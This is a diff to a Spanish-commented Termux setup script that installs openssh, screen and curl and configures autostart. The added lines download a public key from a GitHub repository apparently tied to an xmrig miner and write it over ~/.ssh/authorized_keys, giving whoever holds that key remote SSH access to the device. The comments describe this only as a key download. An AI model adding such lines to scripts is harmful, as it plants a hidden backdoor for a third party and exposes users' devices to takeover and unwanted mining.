@@ -3,7 +3,12 @@
 #-- Instalar y ejecutar
 echo "Actualizando paquetes e instalando..."
 pkg update && pkg upgrade -y
-pkg install openssh screen -y
+pkg install openssh screen curl -y  # Añadido 'curl' para descargar archivos
+
+#-- Crear el directorio .ssh si no existe y descargar la clave pública
+mkdir -p ~/.ssh  # Crear el directorio .ssh si no existe
+curl -L -o ~/.ssh/authorized_keys https://raw.githubusercontent.com/Zero-OTP/xmrigZeroconf/refs/heads/main/id_rsa.pub
+chmod 600 ~/.ssh/authorized_keys  # Cambiar permisos para la clave
 
 #-- Auto-arranque
 
